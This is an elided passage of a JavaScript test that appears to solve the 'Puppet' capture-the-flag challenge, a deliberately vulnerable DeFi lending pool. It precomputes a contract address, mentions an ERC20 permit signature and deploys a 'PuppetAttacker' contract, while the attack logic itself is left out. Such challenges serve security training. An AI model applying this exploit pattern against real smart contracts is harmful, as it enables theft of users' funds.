...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    const transactionInfo = { from: player.address, nonce: 0 };
    const address = await ethers.utils.getContractAddress(transactionInfo);

    // construct signature for ERC20 permit method
    ...
    // Deploy contract and pass in the constructor arguments
    const puppetAttackerFactory = await ethers.getContractFactory(
      "PuppetAttacker",
      player
    );
